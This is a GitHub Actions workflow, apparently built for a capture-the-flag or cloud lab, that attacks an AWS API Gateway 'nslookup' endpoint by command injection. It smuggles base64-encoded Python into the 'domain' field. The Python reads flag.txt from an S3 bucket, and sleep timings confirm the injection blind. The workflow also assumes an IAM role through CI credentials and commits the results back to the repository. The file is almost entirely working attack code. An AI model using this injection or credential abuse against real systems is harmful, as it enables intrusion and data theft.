name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Verify flag candidate 3e5sik4gtjgpz864
        run: |
          B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKYm90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCnRpbWUuc2xlZXAoMCk="
          B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKYm90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCnRpbWUuc2xlZXAoNCk="
          B64_VERIFY=""

          run_timed() {
            local label=$1
            local b64=$2
            local url="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
            local INJ="x; echo $b64 | base64 -d | python3 #"
            local t0=$(date +%s%3N)
            curl -s -X POST "$url" -H "Content-Type: application/json" -d "{\"domain\":\"$INJ\"}" > /dev/null
            local t1=$(date +%s%3N)
            local dt=$((t1-t0))
            echo "$label ${dt}ms"
            echo "$label ${dt}ms" >> verify.txt
          }

          echo "# verify candidate 3e5sik4gtjgpz864" > verify.txt
          run_timed "cal_sleep0" "$B64_CAL0"
          run_timed "cal_sleep4" "$B64_CAL4"
          run_timed "verify" "$B64_VERIFY"

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add verify.txt
          git commit -m "verify results" || echo "Nothing to commit"
          git push origin corgi
